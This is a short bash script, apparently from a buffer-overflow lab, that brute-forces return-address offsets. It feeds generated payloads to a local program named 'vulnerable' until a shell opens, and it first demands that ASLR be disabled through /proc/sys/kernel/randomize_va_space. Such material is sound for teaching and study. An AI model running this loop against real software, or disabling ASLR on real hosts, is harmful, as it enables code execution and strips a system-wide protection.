#/bin/bash
#
# fuzzer.sh
# This is a tool that generates exploitation strings and tries to exploit the
# vulnarable program. Note, that fuzzer.sh must reside in the same directory
# where generator and vulnerable programs are located.
#

# check for ASLR
aslrsetting=/proc/sys/kernel/randomize_va_space
aslr=`cat $aslrsetting`
if [ "$aslr" != "0" ]; then
    printf "cannot proceed, ASLR is enabled. please run %s first\n" \
        "\"echo 0 > $aslrsetting\""
    exit 1
fi

# prepare essentials
buffersize=600 # default
offset=0 # default
if [ "$#" -gt 0 ]; then
    number='^[0-9]+$'
    if ! [[ $1 =~ $number ]]; then
        printf "error: invalid parameter\n"
        exit 1
    fi
    buffersize=$1
fi
it=0
exitflag="/tmp/terminate"
rm -f $exitflag

# generate
while [ ! -f $exitflag ]; do
    printf "try: %s, buffersize: %s, offset: %s, " \
        $it $buffersize $offset
    printf "on success exit shell with: \"touch %s && exit\"\n" \
        $exitflag
    ./generator $buffersize $offset
    if [ "$?" -ne "0" ]; then
        printf "error: invalid generator parameters\n"
        exit 1
    fi
    # exploit
    ./vulnerable `cat payload.txt`
    offset=$(($offset+4)) # consider 4-byte stack alignment
    it=$(($it+1))
done

